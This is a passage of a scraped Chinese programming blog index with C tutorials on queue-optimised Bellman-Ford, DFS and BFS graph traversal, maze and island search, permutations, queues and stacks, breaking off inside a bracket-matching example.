#\r在上一部分简述BF算法的时候留下了一个思考\n在这里展开说明一下\n看标题名字就知道，和队列知识离不开\n优化后的效果大致如下：\n每次选取队列的首顶点u，对u点的所有出边进行松弛操作，例如有一条u→v的边，如果这条边使得源点到v点的距离能缩短，且v点不在队列中，就将v点加入队尾。将u点的所有出边进行松弛过后，就将u点出列，对队列中后面的点继续进行同样操作。\n下面是代码实现，尝试用邻接表来储存图👇：\n#include\u0026lt;stdio.h\u0026gt;\tint dis[6];\rint u[8],v[8],w[8];//根据实际情况设置，要比m大1\rint first[6], next[8];//first是储存点的，next是储存边的，first要比n大1，next要比m大1\rint book[6];//用于标记\rint que[1001];\rint head = 1, tail = 1;//设置队列\rint inf = 99999999;\rint main()\r{\rint n, m;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rdis[i] = inf;\r}\rdis[1] = 0;\rfor (int i = 1; i \u0026lt;= n; i++)\rfirst[i] = -1;\rfor (int i = 1; i \u0026lt;= n; i++)\rbook[i] = 0;\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;u[i], \u0026amp;v[i], \u0026amp;w[i]);\r//邻接表\rnext[i] = first[u[i]];\rfirst[u[i]] = i;\r}\rque[tail] = 1;\rtail++;\rbook[1] = 1;\rwhile (head \u0026lt; tail)\r{\rint k = first[que[head]];//注意k是顶点为que[head]的第一条边\rwhile (k != -1)//先对一个点的所有出边进行松弛\r{\rif (dis[v[k]] \u0026gt; dis[u[k]] + w[k])\r{\rdis[v[k]] = dis[u[k]] + w[k];//更新距离\rif (book[v[k]] == 0)//0表示边的编号不在队列中，把v[k]顶点入队\r{\rque[tail] = v[k];\rtail++;\rbook[v[k]] = 1;\r}\r}\rk = next[k];\r}\rbook[que[head]] = 0;//边出队，并重置为0，因为其他点可能会用到\rhead++;\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, dis[i]);\r}\rreturn 0;\r} 关键就在于要有一个数组来判断重复，即上面的book\n因为同一个顶点在队列中多次出现是毫无意义的，那样就相当于Bellman-Ford没优化了。。。\n**总结一下：**队列优化过后的BF算法，其实和广度优先搜索方式十分类似，差异就是优化过后的点出列后可能会再次入列，这是广度优先不具备的。\n如何判断是否有负环：如果一个点入列的次数超过n次，那么肯定存在负环，因为经过负权边总能使得距离变短\n最短路径的问题就先学习到这里，后面有机会再学习一下其他的算法😩\n","date":"2023-07-17","externalUrl":null,"permalink":"/posts/2023/07/shortest-path-problem/","section":"Posts","summary":"","title":"最短路径问题","type":"posts"},{"content":"\r深度和广度优先是什么？ #\r之前学习过深度和广度优先搜索\n实际上深度和广度都是针对图的遍历而言的\n什么是图？\n请看下图，这是一个简单的有向图👇\n下面是一个简单的无向图👇\n简单的说，图就是由顶点和边组成的，在学离散数学的时候也涉及到了图论的相关知识\n那么使用深度优先搜索来遍历上面这个无向图，得到的顺序就是相应的图中红字（时间戳\n下面就这个无向图再来理解一下\n深度优先的具体过程 #\r首先以一个为走过的顶点作为起始点（1号，沿着起始点去访问其他为走过的顶点，先发现顶点 2，那么再以顶点 2，为起始点再去访问顶点 2 能到达的其他顶点，这样就来到了顶点 4。到了顶点 4，发现没有其他顶点可以到达，于是顶点位置就逐一后退，又退到了最开始的顶点 1，然后从顶点 3 开始尝试遍历。直到所有的顶点走过了，遍历就结束。\n在写代码之前，要先解决一下如何储存图的问题\n最常用的方式是用一个二维数组储存图的邻接矩阵（具体请自行百度\n在邻接矩阵中，例如 a[i][j]=1 则说明从顶点 i 到顶点 j 有一条边，为0则表示无边不可达\n由于这里用的无向图，那么邻接矩阵是关于对角线对称的\n下面是基于深度优先思想对图遍历的代码👇\n#include\u0026lt;stdio.h\u0026gt;\tint a[51][51];\rint book[51];//用于标记\rint sum = 0;\rint n, m;\rvoid dfs(int cur)\r{\rint i;\rprintf(\u0026#34;%d \u0026#34;, cur);//打印遍历点的编号\rsum++;\rif (sum == n)\rreturn;\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[cur][i] == 1 \u0026amp;\u0026amp; book[i] != 1)\r{\rbook[i] = 1;\rdfs(i);\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;//无向图，没有自回点\relse\ra[i][j] = 999999;\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rint x, y;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y);\ra[x][y] = 1;\ra[y][x] = 1;\r}\rbook[1] = 1;\rdfs(1);\rreturn 0;\r} 可以输入一下数据进行验证：\n5 5\r1 2\r1 3\r1 5\r2 4\r3 5\r运行结果为：1 2 4 3 5 用图来表示就是这样\n广度优先的具体过程 #\r使用广度优先搜索方式来遍历的过程：\n首先以一个未访问过的点作为起点，比如顶点 1，将 1 号放入队列，然后将于 1 号相邻且为访问过的点依次放入队列中，如下图👇\n接下来再将顶点 2 相邻且未被访问过的顶点 4放入队列，到此所有点都被访问了\n当然，这里只记录顶点的访问顺序，如果要运用到实际问题，还得加上一些数据（这里不展开，前面文章写过了\n代码实现如下👇\n#include\u0026lt;stdio.h\u0026gt;\tint n, m;\rint a[51][51];\rint book[51]={0};\rint que[10000], head, tail;\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 999999;\r}\r}//初始化一下图\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y);\ra[x][y] = 1;\ra[y][x] = 1;\r}\rhead = 1, tail = 1;\rque[tail] = 1;\rtail++;//队列初始化\rbook[1] = 1;\rwhile (head \u0026lt; tail\u0026amp;\u0026amp; tail \u0026lt;=n)\r{\rint cur = que[head];\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[cur][i] == 1 \u0026amp;\u0026amp; book[i] == 0)\r{\tque[tail] = i;\rtail++;\rbook[i] = 1;\r}\rif (tail \u0026gt; n)\r{\rbreak;\r}\r}\rhead++;\r}\rfor (int i = 1; i \u0026lt;tail; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, que[i]);\r}\r} 数据验证：\n5 5\r1 2\r1 3\r1 5\r2 4\r3 5\r运行结果：1 2 3 5 4 城市地图-图的深度优先遍历 #\r直接来例子，下面是一个有向图\n记录了城市的路线以及距离\n要求从顶点 1 到顶点 5 的最短距离\n这个由于路线比较少，看几眼就能出来，但实际上真实的地图会更复杂\n那么在这里使用深度优先搜索方式来找出最短路径\n代码👇\n#include\u0026lt;stdio.h\u0026gt;\tint a[51][51];\rint book[51];\rint n, m;\rint min = 99999999999;\rvoid dfs(int cur,int dis)\r{\rif (dis \u0026gt; min)\rreturn;\rif (cur == n)\r{\rif (dis \u0026lt; min)\rmin = dis;\rreturn;\r}\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rif (a[cur][i] != 99999999 \u0026amp;\u0026amp; book[i] == 0)\r{\rbook[i] = 1;\rdfs(i,a[cur][i]+dis);\rbook[i] = 0;\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 99999999;\r}\r}//初始化图\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y,d;\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;x, \u0026amp;y,\u0026amp;d);\ra[x][y] = d;//有向图的写法\r}\rdfs(1,0);\rprintf(\u0026#34;%d \u0026#34;, min);\rreturn 0;\r} 由于是有向图，那么邻接矩阵肯定就不是对称的了\n可以将数组下标作为两点，值作为距离\n最少转机-图的广度优先遍历 #\r这是一个无向图\n假如要从顶点 1 飞到顶点 5，要求最少转机次数的路线\n由于不涉及到边的长度，只是涉及到边的个数\n那么尝试使用广度优先搜索方式来解决这个问题\n代码👇\n#include\u0026lt;stdio.h\u0026gt;\tint n, m;\rint a[51][51];\rint head, tail;\rint book[51];\rstruct note\r{\rint x;//编号\rint times;//次数\r};\rstruct note que[100001];\rint main()\r{\rint flag = 0;\rint start, end;\rscanf_s(\u0026#34;%d %d %d %d\u0026#34;, \u0026amp;n, \u0026amp;m,\u0026amp;start,\u0026amp;end);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 999999;\r}\r}//初始化数组\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y);\ra[x][y] = 1;\ra[y][x] = 1;\r}\rhead = 1, tail = 1;\rque[tail].x = start;\rbook[start] = 1;\rtail++;\rwhile (head \u0026lt; tail)\r{\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[que[head].x][i] == 1 \u0026amp;\u0026amp; book[i] == 0)\r{\rque[tail].x = i;\rque[tail].times = que[head].times + 1;\rtail++;\rbook[i] = 1;\r}\rif (que[tail - 1].x == 5)\r{\rflag = 1;\rbreak;\r}\r}\rif (flag ==1)\rbreak;\rhead++;\r}\rprintf(\u0026#34;%d \u0026#34;, que[tail - 1].times);\rreturn 0;\r} 数据测试👇\n5 7 1 5\r1 2\r1 3\r2 3\r2 4\r3 4\r3 5\r4 5\r运行结果：2 当然也可以使用深度优先搜索解决这个问题，但是在这里用广度优先搜索会更快\n广度优先搜索更适用于所有边的权值相同的情况\n**总结：**这篇文章主要还是围绕深度与广度两种搜索方式，结合图论的相关知识，来解决一些实际运用的问题\n不过还是存在一些小疑问：如何记录最短路径或者最少转机这种的路线？如果开数组的话，由于路线的未知性，可能会造成数组会整的很大（个人猜想）\nkeep moving\n","date":"2023-07-15","externalUrl":null,"permalink":"/posts/2023/07/graph-traversal/","section":"Posts","summary":"","title":"图的遍历","type":"posts"},{"content":"\r前言 #\r在说搜索方式之前\n先讲一个简单的问题：求数的全排列\n比如说，123 的全排列就是：123、132、213、231、312、321\n这很简单吧\n全排列的个数就是这个数的位数的阶乘，即 123 的全排列的个数是 （ 3！=3×2×1）\n假如要用 C 语言来写呢？\n应该很快就能想到，3个for循环嘛\n分别控制位上的数字不重复就行了\n那么假如数字更大一点呢？\n比如说 123456789\n一共九位，那么这个数的全排列的个数就是 （ 9！= 362880）\n实际上这个数字的全排列是能用 9 个for循环写出来\n不过那样看着是十分臃肿麻烦的\n下面就通过学习一下深度搜索，来给这样的问题寻找一下新的思路吧\n深度优先搜索 #\r简单的说就是一条路走到底，碰壁再退回找其他路\n先用 123 的全排列来举个例子\n先开一个数组嘛，int num[10]（方便理解，这里就不用0下标了）\n**先从第一个格子（num[1]）开始：**能放入的数字有三个,分别为1，2，3\n**走到第二个格子：**能放入的剩下两个，如果前面放了1，那么现在能放2，3\n**走到第三个格子：**能放的只剩下一个了\n**最后走到第四个格子：**哦？现在手里没数字了，那就说明一个排列组合已经形成\n这个时候你要形成一个新的排列组合，最简单的方式是什么呢？\n没错，拿起离你最近的数字，往后面退，看是否有能交换顺序的数字\n（这也应该是高中数学求排列组合的一种基本方式了\n有了这个思想，我们尝试将其转化为代码实现👇\n#include\u0026lt;stdio.h\u0026gt;\tint num[10];//各个位上的数字，默认为零\rint hand[10];//手中的牌,下标对应数字，值0就是有，1就是没有\rint n;\rvoid func(int count)//cnt表示站在第几个盒子面前\r{\rif (count == n + 1)//假如走到最后一位的外面去了，那么说明排列完毕\r{\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rprintf(\u0026#34;%d\u0026#34;, num[i]);\r}\rprintf(\u0026#34;\\n\u0026#34;);\rreturn; }\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (hand[i] == 0)//手上有这张牌，就放进去\r{\rnum[count] = i;\rhand[i] = 1;\r//接着进入下一个盒子\rfunc(count + 1);//递归\rhand[i] = 0;//func在return之后将格子里的数字要拿出来，这步很重要\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;n);\rfunc(1);\rreturn 0;\r} 假如我们输入一个5，\n那么运行结果就是这样的👇\n具体来看看代码吧，（假如要用for循环的话，估计你还没敲到一半，我已经敲完了👌\n这段代码的核心就在于递归（自己调用自己\n好了（这一句话隔着上一句话已经十多分钟了，一直在组织语言如何更准确的表达整个过程😂\n5 位数不太好表达，这里还是用 3 位数 123 来分析一下原理\n123 是如何重新排列为 132的？以及递归在这个过程中起到的作用：\n假如我们要求的是 123 的全排列，使用上面的代码，进行逐层分析\n首先有至少4个格子叭\n我们从第一个格子开始，有一个从 1 到 3 的 3 次循环，选取手中有的牌并且放入格子，然后立马进入第二个格子，这时（第一个格子的循环是仍然存在的，只是停留在了 1 ）\n到了第二个格子，又是一个从 1 到 3 的 3 次循环，重复上面的操作，然后进入第三个格子\n进入了第三个格子，还是有一个 3 次循环，如果是第一次形成排列（123）\n，那么循环从 1 到 3 ，在3的时候刚好结束，然后走到了第四个格子，完成一次排列\n关键点来了，由于这是一个递归过程，完成排列后手里会收回相应格子使用过的牌\n此时，第三个格子的循环已经结束，但是第二个格子的循环还没结束呢\n第一个排列的时候，第二个格子的循环刚好走到 2 是吧，接下来就是第三次循环（2是被收回了的），由于第三个格子刚好收回了数字 3，那么第二个格子就放进去 3 ，根据代码，能放进去就会移动到下一个格子，并且开启新的循环选择，第三个格子刚好选到 2 ，那么就形成了新的排列（132）\n可能会有疑问，开启第三个格子的新循环时，为什么没有选择到 1 ？\n答：仔细观察代码，在循环中，拿回手牌的时间在后一个格子执行完毕之后，第二个格子开始只进行了第二次循环选择了2，剩了一次循环，第二个格子选择完 2 后由于循环并没有结束，所以并没有return回到第一个格子那里，也就是第二个格子的func函数没有执行完毕，因此第一个格子中的 1 是不会被收回的。\n（深吸一口气）😫\n其实这个代码的核心行也不过 20 行，却饱含深度优先搜索的基本模型\n本质上还是依赖循环，只不过减少了许多不必要的遍历\n理解的关键就在于：当下应该怎样做？以及深度优先这个词的概念\n一个基本的深度优先搜索的基本模型👇\nvoid dfs(int step)\r{\r//判断边界\rfor (int i = 1; i \u0026lt;= n; i++)//尝试每一种可能 {\r//继续下一步\rdfs(step + 1);\r}\r//返回\r} 说点题外的，递归这个东西可能理解起来会有点抽象\n这里简单的举个例子，用于理解递归逻辑\n#include\u0026lt;stdio.h\u0026gt;\tint n;\rvoid func(int x)\r{\rif (x \u0026lt; n)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\rfunc(x + 1);\rprintf(\u0026#34;%d\u0026#34;, t);\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;n);\rfunc(0);\rreturn 0;\r} 上面这段代码，输入一个数字的长度，然后输入相应位数，然后倒序打印\n只不过用了递归的思想\n就这个例子而言，scanf输入，func递归调用，printf打印，这三步是最关键的\n先进入func，录入一个数字之后进入下一个位置，此时printf的函数就被搁置，然后继续录入……\n可以看作这样一个过程：从左到右每一位都执行了func函数，但是都没有执行完毕，只有最后一位录入后，才从最后开始倒着往前结束之前的函数\n用代码来看大致是这样👇\nscanf_s(\u0026#34;%d\u0026#34;, t1);\r{\rscanf_s(\u0026#34;%d\u0026#34;, t2);\r{\rscanf_s(\u0026#34;%d\u0026#34;, t3);\rprintf(\u0026#34;%d\u0026#34;, t3);\r}\rprintf(\u0026#34;%d\u0026#34;, t2);\r}\rprintf(\u0026#34;%d\u0026#34;, t1); 可以看到虽然 t1 是最早录入的，但是确实最晚打印的，123便倒序为321\n走迷宫 #\r学习搜索，就离不开迷宫\n简单的来说迷宫就是一个二维数组，用数值来区分障碍和道路\n上面已经学习了深度优先的搜索方式\n这里就简单的实践一下\n**题目：**生成一个迷宫，保证迷宫有解，设立起点坐标和目标坐标，一步走一格，求起点到目标的_最短路径_\n先想想吧，离不开基本模型\n直接上代码👇\n#include\u0026lt;stdio.h\u0026gt;\rint a[51][51];\rint mark[51][51];\rint n, m;//n为行，m为列\rint startx, starty, endx, endy;\rint min = 999999999;\rvoid func(int x, int y, int step)\r{\rint next[4][2] = { {0,1},//向右\r{1,0},//向下走\r{0,-1},//向左走\r{-1,0}//向右走\r};\rint tx, ty, k;\rif (x == endx \u0026amp;\u0026amp; y == endy)\r{\rif (step \u0026lt; min)\r{\rmin = step;\r}\rreturn;\r}\rfor (int k = 0; k \u0026lt;=3; k++)//模拟上下左右 四种走法\r{\rtx = x + next[k][0];\rty = y + next[k][1];\r//还要判断是否越界\rif (tx \u0026lt;1 || tx \u0026gt;n || ty \u0026lt;1 || ty \u0026gt; m)\rcontinue;//越界就不考虑这一种走法了\rif (a[tx][ty] == 0 \u0026amp;\u0026amp; mark[tx][ty] == 0)//判断没走过的空地\r{\rmark[tx][ty] = 1;//标记为走过\rfunc(tx, ty, step + 1);\rmark[tx][ty] = 0;//这两步似曾相识吧\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rfor (int j = 1; j \u0026lt;=m; j++)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\ra[i][j] = t;\r}\r}//录入迷宫，0为空地，1为障碍物\rscanf_s(\u0026#34;%d %d %d %d\u0026#34;, \u0026amp;startx, \u0026amp;starty, \u0026amp;endx, \u0026amp;endy);//录入起点和终点\rmark[startx][starty] = 1;\rfunc(startx, starty, 0);\rprintf(\u0026#34;%d\u0026#34;, min);\rreturn 0;\r} 小结：深度优先搜索以深度为优先的原则进行遍历，因此会尽可能深入到图的某一分支，直到无路可走才回退。这使得深度优先搜索在寻找路径、判断连通性、找连通分量等问题上具有广泛应用。\n需要注意的是，深度优先搜索可能陷入无限循环，因此在实现时需要考虑避免重复访问节点的情况，例如通过使用一个标记数组来记录节点的访问状态，也就是上面的mark数组起到的作用。\n广度优先搜索 #\r还是接着用迷宫这个模型来学习\n深度优先搜索如其名，一条路走到尽头才回来\n那么广度优先的话，肯定就不会一条路走到“死”啦\n遇到选择时，会尝试每一种决策\n可以想象为，原地转一圈看哪里可以走（写入计划里），按照计划顺序往外走一步，再转一圈后记下这时周围的情况（放到后面的计划里），然后退到上一步，看上一步的计划是否走完，如果没走完就继续上一步剩余的计划，重要的是，每走到一新位置，都要原地转一圈，将能走的写入计划，执行计划要按照先后顺序进行\n举个例子（先不管坐标的问题，只是理解概念），我在起点先转一圈，发现能走 右边 和 下边，那么我就在计划里写上 right1，down1，之后执行计划向右走一步，发现能走的只有下边，便在计划后边加上 down2 ，那么现在计划就成了 【right1，down1，down2 】，第一个计划就这样完成，因为我们要优先尝试一个点的所有方式，所以这时候要退回到刚刚那个点，去完成刚那个点的剩余计划，于是进行down1计划\n网上找了两张图，可以试着理解👇\n如果我这里讲的不清楚的话，那就来看看代码的思路叭\n广度优先肯定和深度优先是不一样的哦\n由于广度优先追求的是一个广度，那么递归思想带来的“一冲到底”肯定就不能使用了\n不过在之前的文章中，学习了队列的相关知识\n看看上面我所说的《计划》这个词，是否能和队列联系起来呢？\n上代码👇：\n#include\u0026lt;stdio.h\u0026gt;\tstruct note //结构体实现队列\r{\rint x;\rint y;\rint s;\r};\rstruct note queue[2501];\rint head=1, tail=1;\rint map[51][51];\rint mark[51][51];//用于标记哪些路是走过的\rint step = 0;\rint main()\r{\rint next[4][2] = {\r{0,1},\r{1,0},\r{0,-1},\r{-1,0}\r};//方向数组\rint n, m,flag=0;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);//录入行、列\rfor(int i=1;i\u0026lt;=n;i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\rmap[i][j] = t;\r}\r}//录入地图\rint startx, starty, endx, endy;\rscanf_s(\u0026#34;%d %d %d %d\u0026#34;, \u0026amp;startx, \u0026amp;starty, \u0026amp;endx, \u0026amp;endy);\rmark[startx][starty] = 1;//先标记起点坐标\rqueue[tail].x = startx;\rqueue[tail].y = starty;\rqueue[tail].s = 0;\rtail++;\rwhile (head \u0026lt; tail)\r{\rfor (int i = 0; i \u0026lt; 4; i++)//尝试四个方向\r{\rint tx = queue[head].x + next[i][0];\rint ty = queue[head].y + next[i][1];\rif (tx\u0026lt;1 || tx\u0026gt;n || ty\u0026lt;1 || ty\u0026gt;m)//判断是否越界\rcontinue;\r//如果不越界就加长队列\rif (map[tx][ty] == 0 \u0026amp;\u0026amp; mark[tx][ty] == 0)//没有障碍物，也没有走过的格子\r{\rmark[tx][ty] = 1;\rqueue[tail].x = tx;\rqueue[tail].y = ty;\rqueue[tail].s = queue[head].s + 1;\rtail++;\r}\rif (tx == endx \u0026amp;\u0026amp; ty == endy)\r{\rflag = 1;//只是一个标志变量，减少不必要的循环\rbreak;\r}\r}\rif (flag == 1)\rbreak;//说明已经找到了\rhead++;//没有找到的话就后移head，继续重复这个过程\r}\rprintf(\u0026#34;%d\u0026#34;, queue[tail - 1].s);\rreturn 0;\r} 如果队列能够看懂的话，那这段代码应该没什么难度，只是初想可能想不到用队列来解决\n**小结：**广度优先搜索从起始节点开始，逐层向外扩展，先遍历距离起始节点较近的节点，然后再访问离起始节点更远的节点。\n**与深度优先的不同点：**广度优先搜索遍历过程中不会陷入无限循环，因为每个节点只被访问一次，并且按照距离起始节点的远近顺序进行访问。\n海岛面积 #\r**题目：**海岛面积\n简言之，给一个地图录入海拔，0是海拔为0（就是海洋的意思），大于 0 就是相对应的海拔\n给出一个海岛上的坐标，求这个海岛的面积\n结合上面的广度优先搜索方式，做这道题就会十分简单了\n上代码👇：\n#include\u0026lt;stdio.h\u0026gt;\tstruct note {\rint x;\rint y;\r};\rstruct note queue[2501];\rint head=1, tail=1;\rint map[51][51];\rint mark[51][51];//用于标记哪些路是走过的\rint step = 0;\rint max = 1;\rint main()\r{\rint next[4][2] = {\r{0,1},\r{1,0},\r{0,-1},\r{-1,0}\r};//方向数组\rint n, m,flag=0;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);//录入行、列\rfor(int i=1;i\u0026lt;=n;i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\rmap[i][j] = t;\r}\r}//录入地图\rint startx, starty;\rprintf(\u0026#34;请输入坐标：\\n\u0026#34;);\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;startx, \u0026amp;starty);\rmark[startx][starty] = 1;//先标记起点坐标\rqueue[tail].x = startx;\rqueue[tail].y = starty;\rtail++;\rwhile (head \u0026lt; tail)\r{\rfor (int i = 0; i \u0026lt; 4; i++)//尝试四个方向\r{\rint tx = queue[head].x + next[i][0];\rint ty = queue[head].y + next[i][1];\rif (tx\u0026lt;1 || tx\u0026gt;n || ty\u0026lt;1 || ty\u0026gt;m)//判断是否越界\rcontinue;\r//如果不越界就加长队列\rif (map[tx][ty] != 0 \u0026amp;\u0026amp; mark[tx][ty] == 0)//不能是海洋，而且没走过的\r{\rqueue[tail].x = tx;\rqueue[tail].y = ty;\tmark[tx][ty] = 1;//标记这个点\rtail++;\rmax++;\r}\r}\rhead++;//没有找到的话就后移head，继续重复这个过程\r}\rprintf(\u0026#34;\\n该点面积为:%d\\n\u0026#34;, max);\rreturn 0;\r} 可以看出基本的模型吧\n程序的执行结果👇\n当然，利用深度优先也可以做出这道题\n这里就不写代码了，有兴趣自己试试吧（困😩\n","date":"2023-07-12","externalUrl":null,"permalink":"/posts/2023/07/depth-first-search-dfs-and-breadth-first-search-bfs/","section":"Posts","summary":"","title":"深度与广度搜索","type":"posts"},{"content":"\r队列 #\r队列的概念：只允许在一端进行插入数据操作，在另一端进行删除数据操作的特殊线性表\n队列的两端：\n队尾：进行插入操作的一端称为队尾\n队头：进行删除操作的一端称为队头\n先举一个例子：\n给出一段序列： 6 3 1 7 5 8 9 2 4\n对这段序列进行以下操作：删除第一个数字，将第二个数字移到末尾，删除第三个数字，将第四个数字移到末尾……以此类推，直到剩下最后一个数字，并且将其删除，最后按照删除的顺序将被被删除的数字连成一段新序列，求这段序列？\n那么要解决这个问题，数组肯定是离不开的\n和队列的概念联系起来，一端要插入，一端要删除，那么这个数组就要开大一点\nint a[101]={6,3,1,7,5,8,9,2,4}; 并且我们需要两个变量来记录队首和队尾（可以理解为指针吧\nhead=0;\rtail=10; 序列中只有九个数字，但是tail设置成 9 是为了节约时间\n那么队列的操作具体如何进行的呢？\n就这道题而言，先将第一个队首输出队，head后移指向新的队首，第二个队首会被移到末端，并且head和tail都同时后移\n基本的代码思路如下：\n#include\u0026lt;stdio.h\u0026gt;\tint main()\r{\rint a[101] = { 6,3,1,7,5,8,9,2,4 };\rint head = 0;\rint tail = 9;\rwhile (head \u0026lt; tail)\r{\rprintf(\u0026#34;%d \u0026#34;, a[head]);\rhead++;\ra[tail] = a[head];\rtail++;\rhead++;\r}\rreturn 0;\r} 当然代码也可以改进为用结构体\n就像这种方式稍微包装一下：\nstruct queue\r{\rint data[1000];\rint head;\rint tail; } 栈 #\r栈可以理解为一个只有一端开口的竖直乒乓球筒，想要拿到最下面的球，你先把上面的球一个个拿出来\n换而言之，栈的特点就是：先进后出，最先放进去的球要最后才能拿出来\n同样举个例子：\n要判断一段字符串是否回文，应该怎样设计？\n“abcba” 是回文，\u0026ldquo;abba\u0026rdquo; 是回文，\u0026ldquo;abca\u0026rdquo; 就不是回文 那么常见的思路就是创建一个一维数组，并从两边向中间靠近比较\n基本思路：\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tint main()\r{\rchar s[100];\rscanf_s(\u0026#34;%s\u0026#34;, s, 100);\rint len = strlen(s);\rint mid = len / 2;\rfor (int i = 0; i \u0026lt; len; i++)\r{\rif (s[i] != s[len - i - 1])\r{\rprintf(\u0026#34;No\u0026#34;);\rreturn 0;\r}\r}\rprintf(\u0026#34;Yes\u0026#34;);\rreturn 0;\r} 当然，这段代码没有涉及到栈的利用，只是简单的首尾向中间靠拢比较字符而已\n假如我们要利用栈的思想去解决这道题的话\n代码得这样写👇\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tint main()\r{\rchar a[101], s[101];\rscanf_s(\u0026#34;%s\u0026#34;, a, 101);\rint len = strlen(a);\rint mid = len / 2 ;\rint top = 0;\rint next=mid;\rfor (int i = 0; i \u0026lt; mid; i++)\r{\rs[++top] = a[i];\r}//将前面一半的字符串放入栈中\rif (len % 2 != 0)\rnext = mid + 1;//奇偶对另外一段的起始下标有影响的\rfor (int i = next; i \u0026lt; len; i++)\r{\rif (a[i] != s[top])\rbreak;\rtop--;\r}\rif (top == 0)\rprintf(\u0026#34;Yes\u0026#34;);\relse\rprintf(\u0026#34;No\u0026#34;);\rreturn 0;\r} 这个例子比较简单\n那么来看看洛谷上的题吧\n有效的括号 #\r题目：有效的括号\n给定一个只包括 '('，')'，'{'，'}'，'['，']' 的字符串 s ，判断字符串是否有效。\n左括号必须用相同类型的右括号闭合。\n左括号必须以正确的顺序闭合。\n每个右括号都有一个对应的相同类型的左括号。\n1 \u0026lt;= s.length \u0026lt;= 104\n示例：\n\u0026ldquo;( [ { } ( ) ] )\u0026rdquo; 是能匹配成功的，而“( [ ) ]”是不能匹配成功的\n先捋一下思路\n结合条件的第二点和示例可以看出，括号的闭合是就近原则的，意思是左括号会和最近的右括号进行匹配，如果类型不同则字符串为无效\n那么根据这个思路可以写出这样的代码👇：\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tchar s[10001];\rchar a[10002];\rchar pairs(char c);//返回对应括号的函数\rint main()\r{\rscanf_s(\u0026#34;%s\u0026#34;, s, 10001);\rint len = strlen(s);\rint top = 0;\rif (len % 2 == 1)\r{\rprintf(\u0026#34;No\u0026#34;);\rreturn 0;\r}//括号都是一对一对的，长度肯定是偶数\rfor (int i = 0; i \u0026lt; len; i++)\r{\rif (s[i] == \u0026#39;(\u0026#39; || s[i] == \u0026#39;[\u0026#39; || s[i] == \u0026#39;{\u0026#39;)\r{\ra[top] = s[i];//将左括号放入栈顶\rtop++;\r}\relse if(s[i] == \u0026#39;)\u0026#39; || s[i] == \u0026#39;]\u0026#39; || s[i] == \u0026#39;}\u0026#39;)//右括号的情况\r{\rchar c = pairs(s[i]);\rif (a[top-1] == c)\r{\rtop--;//就近匹配，如果成功就退栈\r}\r}\relse//有非括号字符\r{\rprintf(\u0026#34;输入有误\u0026#34;);\rreturn 0;\r}\r}\rif (top == 0)//查看栈是否全部退出，即是否有括号剩余没有匹配的\r{\rprintf(\u0026#34;Yes\u0026#34;);\r}\relse\r{\rprintf(\u0026#34;No\u0026#34;);\r}\r}\rchar pairs(char c)\r{\rif (c == \u0026#39;)\u0026#39;)\rreturn \u0026#39;(\u0026#39;;\rif (c == \u0026#39;]\u0026#39;)\rreturn \u0026#39;[\u0026#39;;\rif (c == 